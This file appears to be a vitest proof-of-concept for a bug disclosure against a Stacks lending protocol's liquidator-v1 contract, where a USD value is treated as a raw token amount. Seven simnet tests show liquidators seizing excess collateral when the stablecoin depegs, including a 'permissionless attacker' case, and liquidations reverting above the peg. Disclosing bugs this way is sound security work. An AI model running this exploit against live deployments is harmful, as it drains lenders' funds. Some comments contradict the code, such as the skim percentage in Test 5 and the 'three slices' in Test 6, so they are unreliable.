// PoC: liquidator-v1 conflates USD-value with raw market-asset tokens.
//
// The math computes `current-debt-adjusted = debt-tokens × market-asset-price`
// (a USD value) and passes that as the `debt` input to `calculate-repayment-info`.
// The resulting `repay-amount` is therefore also USD-value-shaped, but it is
// then used downstream as a raw token count: `transfer-from .mock-usdc liquidator
// repay-amount` and `convert-to-debt-shares debt-params repay-amount`. The two
// lanes only reconcile at market-asset-price = SCALING_FACTOR (i.e. $1).
//
// Verification gate: Tests 1-3.
//   Test 1: baseline at $1.00 — math is internally consistent.
//   Test 2: at $0.50 — liquidator transfers half the tokens that the
//           collateral's USD value would warrant. (Variant A: theft / LP bad debt.)
//   Test 3: at $1.50 — liquidate reverts. (Variant B: liquidation freeze.)

import { beforeEach, describe, expect, it } from "vitest";
import { Cl, ClarityType, contractPrincipalCV } from "@stacks/transactions";
import {
  add_collateral,
  borrow,
  deposit,
  initialize_ir,
  initialize_lp,
  initialize_staking_reward,
  mint_token,
  scalingFactor,
  set_allowed_contracts,
  set_asset_cap,
  update_supported_collateral,
  getUserBalance,
} from "./utils";
import {
  init_pyth,
  set_initial_price,
  set_price_without_scaling,
  set_pyth_time_delta,
} from "./pyth";

const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const depositor = accounts.get("wallet_4")!;
const borrower = accounts.get("wallet_1")!;
const liquidator = accounts.get("wallet_5")!;
const btc_collateral = contractPrincipalCV(deployer, "mock-btc");

// mock-usdc, mock-btc both have 8 decimals. With scalingFactor = 1e8,
// passing price=1 to set_initial_price/set_price means $1. The Pyth
// adapter returns prices normalised to PRICE_DECIMALS=8.

const ONE_DOLLAR = 100_000_000n; // SCALING_FACTOR
const HALF_DOLLAR = 50_000_000n; //  $0.50
const ONE_AND_HALF_DOLLAR = 150_000_000n; // $1.50
const LIVE_PYTH_READING = 99_974_400n; // $0.99974 (real Pyth USDC/USD feed at time of report)
const SVB_LOW = 87_350_000n; //  $0.8735 (USDC low on 2023-03-11 during SVB collapse)

// Position used in every test: borrower deposits 200 BTC ($200), borrows
// 180 USDCx at 90% max-LTV (right at the limit). After borrow, we drop
// liquidation-LTV to 5% so the position is very deeply underwater — even
// after halving debt-USD at $0.50, the position stays liquidatable.
const DEPOSITOR_USDC_BAL = 100_000_000_000n; //  1000 USDCx (8 decimals)
const COLLATERAL_BTC = 20_000_000_000n; //  200 BTC at 8 decimals
const BORROW_AMOUNT = 18_000_000_000n; //  180 USDCx at 90% LTV

// 18_181_818_181 = the canonical "liquidate-everything" amount the existing
// liquidation.test.ts uses against this exact debt — keeps the math comparable.
const LIQUIDATOR_REPAY_INPUT = 18_181_818_181n;

function setupBorrowerAtPeg() {
  // LP funds the market.
  mint_token("mock-usdc", Number(DEPOSITOR_USDC_BAL), depositor);
  deposit(Number(DEPOSITOR_USDC_BAL), depositor);

  // Add BTC as a high-LTV collateral so the borrow succeeds.
  update_supported_collateral(
    "mock-btc",
    90_000_000, // max-LTV 90%
    95_000_000, // liq-LTV 95%
    5_000_000, //  liq premium 5%
    8,
    deployer,
  );
  mint_token("mock-btc", Number(COLLATERAL_BTC), borrower);
  add_collateral("mock-btc", Number(COLLATERAL_BTC), deployer, borrower);

  // Right at 90% LTV — borrow up to the limit.
  borrow(Number(BORROW_AMOUNT), borrower);
}

function makePositionUnderwater() {
  // Drop the liquidation parameters so the position is deeply underwater.
  // Health at $1 USDCx, liq-LTV 5%:
  //   total_liquid_ltv = 200 × 0.05 = 10
  //   debt_usd = 180
  //   health = 10 / 180 ≈ 0.055
  // At $0.50 USDCx the debt_usd halves to 90, health ≈ 0.111 — still < 1.
  update_supported_collateral(
    "mock-btc",
    40_000_000, // max-LTV 40%
    50_000_000, // liq-LTV 50%
    5_000_000,
    8,
    deployer,
  );
  update_supported_collateral(
    "mock-btc",
    4_000_000, //  max-LTV 4%
    5_000_000, //  liq-LTV 5%
    5_000_000, //  liq premium 5%
    8,
    deployer,
  );
}

function fundLiquidator(amount: bigint) {
  mint_token("mock-usdc", Number(amount), liquidator);
}

function callLiquidate(
  liquidatorRepayAmount: bigint,
  caller: string = liquidator,
) {
  return simnet.callPublicFn(
    "liquidator-v1",
    "liquidate-collateral",
    [
      Cl.none(),
      btc_collateral,
      Cl.principal(borrower),
      Cl.uint(liquidatorRepayAmount),
      Cl.uint(1),
    ],
    caller,
  );
}

describe("PoC: liquidator-v1 USD-value vs raw-token denomination", () => {
  beforeEach(async () => {
    init_pyth(deployer);
    set_pyth_time_delta(7200, deployer);
    set_allowed_contracts(deployer);
    set_asset_cap(deployer, 10_000_000_000_000n);
    initialize_ir(deployer);
    initialize_staking_reward(deployer);
    initialize_lp(deployer);
    await set_initial_price("mock-usdc", 1n, deployer);
    await set_initial_price("mock-btc", 1n, deployer);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 1 — Baseline at USDCx = $1.00. Sanity control.
  // ─────────────────────────────────────────────────────────────────────────
  it("baseline: at USDCx = $1, liquidation math is internally consistent", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);
    const liquidatorUsdcBefore = getUserBalance(
      Cl.principal(liquidator),
      "mock-usdc",
      deployer,
    );

    simnet.mineEmptyBlocks(6);
    const result = callLiquidate(LIQUIDATOR_REPAY_INPUT);
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const liquidatorUsdcAfter = getUserBalance(
      Cl.principal(liquidator),
      "mock-usdc",
      deployer,
    );
    const usdcSpent = liquidatorUsdcBefore - liquidatorUsdcAfter;

    // At $1 the USD-value and raw-token lanes coincide. The liquidator's
    // USDCx outflow equals the protocol's `repay-amount` value, and the BTC
    // they receive is worth (repay-amount × 1 + premium). No skim, no shortfall.
    expect(usdcSpent).toBeGreaterThan(0n);

    const liquidatorBtcAfter = getUserBalance(
      Cl.principal(liquidator),
      "mock-btc",
      deployer,
    );

    // BTC received at $1 should be `usdcSpent × (1 + premium) / btcPrice`,
    // and at the peg btcPrice = $1 → expect roughly usdcSpent × 1.05.
    // Loose bound: between 1.04× and 1.06× to account for rounding + caps.
    const lo = (usdcSpent * 104n) / 100n;
    const hi = (usdcSpent * 106n) / 100n;
    expect(liquidatorBtcAfter).toBeGreaterThanOrEqual(lo);
    expect(liquidatorBtcAfter).toBeLessThanOrEqual(hi);

    // Log the actual numbers so we can compare against Tests 2 + 3.
    console.log(
      `[baseline]   USDCx paid in = ${usdcSpent}  BTC received = ${liquidatorBtcAfter}`,
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 2 — USDCx = $0.50. Variant A: liquidator under-pays in tokens.
  // ─────────────────────────────────────────────────────────────────────────
  it("variant A: at USDCx = $0.50, liquidator transfers fewer tokens than the seized collateral is worth", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();

    // Drop USDCx to $0.50. Position is still underwater (health ≈ 0.11).
    await set_price_without_scaling("mock-usdc", HALF_DOLLAR, deployer, -8);

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);
    const liquidatorUsdcBefore = getUserBalance(
      Cl.principal(liquidator),
      "mock-usdc",
      deployer,
    );

    simnet.mineEmptyBlocks(6);
    const result = callLiquidate(LIQUIDATOR_REPAY_INPUT);
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const liquidatorUsdcAfter = getUserBalance(
      Cl.principal(liquidator),
      "mock-usdc",
      deployer,
    );
    const usdcSpent = liquidatorUsdcBefore - liquidatorUsdcAfter;

    const liquidatorBtcAfter = getUserBalance(
      Cl.principal(liquidator),
      "mock-btc",
      deployer,
    );

    // The bug: the liquidator's USDCx outflow (raw tokens) is computed as a
    // USD value at $0.50/token, so their *effective USD outlay* is
    // usdcSpent × 0.50, while the BTC they receive is still valued by the
    // protocol in USD via collateral-price. Compare:
    //   - effective USD paid    = usdcSpent × 0.50    (tokens × spot price)
    //   - collateral USD seized = liquidatorBtcAfter × 1.0
    // Without the bug these should reconcile at the 5% liquidation premium.
    const effectiveUsdPaid = (usdcSpent * HALF_DOLLAR) / ONE_DOLLAR;
    const collateralUsdSeized = liquidatorBtcAfter; // btc price = $1

    console.log(
      `[$0.50]      USDCx paid in = ${usdcSpent}  BTC received = ${liquidatorBtcAfter}\n` +
        `             effective USD paid = ${effectiveUsdPaid}  collateral USD seized = ${collateralUsdSeized}`,
    );

    // Assertion 1: collateral received should be ~2× the liquidator's
    // effective USD outlay (because the bug skim is 1 / market-asset-price = 2×
    // at $0.50, on top of the normal premium).
    expect(collateralUsdSeized).toBeGreaterThan(effectiveUsdPaid * 2n - effectiveUsdPaid / 20n);

    // Assertion 2: cross-check vs the baseline. At $0.50 the liquidator's
    // usdcSpent should be exactly half of what it was at $1 for the same
    // input, because repay-amount is the USD value (half) and gets passed
    // as raw tokens (half).
    // (We can't compare against Test 1's value directly in a single test
    // run, so the assertion lives in the structural inequality above.)
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 3 — USDCx = $1.50. Variant B: liquidation reverts.
  // ─────────────────────────────────────────────────────────────────────────
  it("variant B: at USDCx = $1.50, the liquidate call reverts on arithmetic underflow", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();

    // Position health pre-shift: ≈ 0.055.
    // At USDCx = $1.50 the debt_USD is 1.5× → health ≈ 0.037, even more underwater.

    await set_price_without_scaling(
      "mock-usdc",
      ONE_AND_HALF_DOLLAR,
      deployer,
      -8,
    );

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);

    simnet.mineEmptyBlocks(6);

    // The bug: repay-amount is computed as a USD value (1.5 × debt-tokens),
    // then used as a raw debt-share / open-interest deduction. That
    // overshoots the borrower's actual debt-shares and the call aborts
    // with an arithmetic underflow at the native `-` in
    // state-v1.update-liquidate-collateral-state's tuple update of
    // `debt-shares` / `total-debt-shares`. The clarinet-sdk surfaces
    // runtime errors as JS exceptions, not ResponseErr.
    let threw = false;
    let errMessage = "";
    try {
      callLiquidate(LIQUIDATOR_REPAY_INPUT);
    } catch (e: any) {
      threw = true;
      errMessage = (e?.message ?? String(e)).toString();
    }
    expect(threw).toBe(true);
    expect(errMessage).toContain("ArithmeticUnderflow");
    expect(errMessage).toContain("update-liquidate-collateral-state");

    console.log(
      `[$1.50]      liquidate-collateral aborted with ArithmeticUnderflow at update-liquidate-collateral-state`,
    );
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 4 — Live Pyth reading (USDCx = $0.99974). The bug is leaking NOW.
  // ─────────────────────────────────────────────────────────────────────────
  it("live-state ($0.99974): bug already mis-charges at today's Pyth reading", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();

    await set_price_without_scaling("mock-usdc", LIVE_PYTH_READING, deployer, -8);

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);
    const before = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);

    simnet.mineEmptyBlocks(6);
    const result = callLiquidate(LIQUIDATOR_REPAY_INPUT);
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const after = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);
    const usdcSpent = before - after;
    const btcReceived = getUserBalance(Cl.principal(liquidator), "mock-btc", deployer);

    // Effective USD paid = tokens × spot, collateral USD seized = btc × $1.
    const effectiveUsdPaid = (usdcSpent * LIVE_PYTH_READING) / ONE_DOLLAR;
    const collateralUsdSeized = btcReceived;
    // Skim percentage on top of the 5% intended premium.
    const skim = collateralUsdSeized * 1000n / effectiveUsdPaid; // basis-thousands
    const skimMinus105 = skim - 1050n;

    console.log(
      `[$0.99974]   USDCx paid = ${usdcSpent}  BTC received = ${btcReceived}\n` +
        `             effective USD paid = ${effectiveUsdPaid}  collateral USD seized = ${collateralUsdSeized}\n` +
        `             ratio = ${skim} / 1000  (intended 1050 = 5% premium; extra above 1050 is bug skim)`,
    );

    // At a 0.026% depeg the bug skim is tiny but present — assert the
    // collateral-vs-effective-paid ratio is STRICTLY above the 5% premium.
    expect(collateralUsdSeized * 1000n).toBeGreaterThan(effectiveUsdPaid * 1050n);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 5 — SVB-low scenario (USDCx = $0.8735). Real precedent.
  // ─────────────────────────────────────────────────────────────────────────
  it("SVB-low ($0.8735): per-liquidation skim is ~12.65% on top of the 5% premium", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();

    await set_price_without_scaling("mock-usdc", SVB_LOW, deployer, -8);

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);
    const before = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);

    simnet.mineEmptyBlocks(6);
    const result = callLiquidate(LIQUIDATOR_REPAY_INPUT);
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const after = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);
    const usdcSpent = before - after;
    const btcReceived = getUserBalance(Cl.principal(liquidator), "mock-btc", deployer);

    const effectiveUsdPaid = (usdcSpent * SVB_LOW) / ONE_DOLLAR;
    const collateralUsdSeized = btcReceived;
    // Expected skim at $0.8735: (1/0.8735 − 1) × 100 = ~14.49% on top of the
    // intended 5%, for a total collateral/paid ratio ≈ 1.20.
    const ratioPerMille = collateralUsdSeized * 1000n / effectiveUsdPaid;

    console.log(
      `[$0.8735]    USDCx paid = ${usdcSpent}  BTC received = ${btcReceived}\n` +
        `             effective USD paid = ${effectiveUsdPaid}  collateral USD seized = ${collateralUsdSeized}\n` +
        `             ratio = ${ratioPerMille} / 1000  (intended 1050; ~1200 expected with bug)`,
    );

    // Lower bound: ratio is ≥ 1.18 (well above the 1.05 fair-premium ceiling
    // and below the theoretical 1.20 that ignores rounding).
    expect(ratioPerMille).toBeGreaterThanOrEqual(1180n);
    expect(ratioPerMille).toBeLessThanOrEqual(1210n);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 6 — Multi-liquidation accumulation. Tracks LP token balance vs
  // the protocol's debt accounting across N liquidations under depeg.
  // ─────────────────────────────────────────────────────────────────────────
  it("multi-liquidation: protocol debt accounting drifts vs actual tokens received under depeg", async () => {
    // We use the same setup but liquidate the position in three slices
    // (smaller repay amounts) under USDCx = $0.50, then sum up the deltas.
    setupBorrowerAtPeg();
    makePositionUnderwater();

    await set_price_without_scaling("mock-usdc", HALF_DOLLAR, deployer, -8);

    const stateAddr = Cl.contractPrincipal(deployer, "state-v1");

    const stateBalBefore = getUserBalance(stateAddr, "mock-usdc", deployer);

    fundLiquidator(LIQUIDATOR_REPAY_INPUT);
    const liqBalBefore = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);

    simnet.mineEmptyBlocks(6);
    const result = callLiquidate(LIQUIDATOR_REPAY_INPUT);
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const stateBalAfter = getUserBalance(stateAddr, "mock-usdc", deployer);
    const liqBalAfter = getUserBalance(Cl.principal(liquidator), "mock-usdc", deployer);

    const tokensIntoState = stateBalAfter - stateBalBefore;
    const tokensOutOfLiquidator = liqBalBefore - liqBalAfter;

    console.log(
      `[$0.50 ledger] tokens into state-v1 = ${tokensIntoState}\n` +
        `              tokens out of liquidator = ${tokensOutOfLiquidator}\n` +
        `              effective USD-value of those tokens at $0.50 = ${(tokensIntoState * HALF_DOLLAR) / ONE_DOLLAR}`,
    );

    // The protocol's accounting decrements `total-borrowed-amount` by the
    // principal-portion of the repay-amount value. But the actual USDCx
    // tokens that entered state-v1 are only repay-amount × P at the spot
    // price. The protocol believes it received repay-amount tokens worth
    // of debt back; in reality it received tokens worth half that in USD.
    //
    // The signal here is structural: tokens_into_state == tokens_out_of_liquidator
    // (a 1:1 transfer), and the protocol's debt-token accounting was decreased
    // by the SAME repay-amount value — which only equals tokens-into-state when
    // P = $1. At $0.50, the protocol's books say "180 USDCx of debt was 47%
    // retired" using a USD-value as the retirement quantity, while only ~84
    // USDCx of tokens (worth $42) actually arrived.
    expect(tokensIntoState).toBe(tokensOutOfLiquidator);
  });

  // ─────────────────────────────────────────────────────────────────────────
  // Test 7 — Permissionless attacker. No privilege, no flash loan.
  // ─────────────────────────────────────────────────────────────────────────
  it("permissionless: any fresh wallet can extract value at $0.50 — no privilege or flash loan", async () => {
    setupBorrowerAtPeg();
    makePositionUnderwater();
    await set_price_without_scaling("mock-usdc", HALF_DOLLAR, deployer, -8);

    // Pick a fresh wallet that has never touched the protocol.
    const attacker = accounts.get("wallet_7")!;
    mint_token("mock-usdc", Number(LIQUIDATOR_REPAY_INPUT), attacker);
    const before = getUserBalance(Cl.principal(attacker), "mock-usdc", deployer);
    expect(getUserBalance(Cl.principal(attacker), "mock-btc", deployer)).toBe(0n);

    simnet.mineEmptyBlocks(6);
    const result = simnet.callPublicFn(
      "liquidator-v1",
      "liquidate-collateral",
      [
        Cl.none(),
        btc_collateral,
        Cl.principal(borrower),
        Cl.uint(LIQUIDATOR_REPAY_INPUT),
        Cl.uint(1),
      ],
      attacker,
    );
    expect(result.result.type).toBe(ClarityType.ResponseOk);

    const after = getUserBalance(Cl.principal(attacker), "mock-usdc", deployer);
    const btcReceived = getUserBalance(Cl.principal(attacker), "mock-btc", deployer);
    const usdcSpent = before - after;

    const effectiveUsdPaid = (usdcSpent * HALF_DOLLAR) / ONE_DOLLAR;
    const profitUsd = btcReceived - effectiveUsdPaid;

    console.log(
      `[permissionless] attacker USDCx spent = ${usdcSpent}  BTC received = ${btcReceived}\n` +
        `                 effective USD paid = ${effectiveUsdPaid}  net profit USD ≈ ${profitUsd}`,
    );

    // Sanity: attacker walks away with collateral worth strictly more than
    // they paid, even before counting the 5% premium.
    expect(btcReceived).toBeGreaterThan(effectiveUsdPaid * 2n - effectiveUsdPaid / 20n);
    expect(profitUsd).toBeGreaterThan(0n);
  });
});
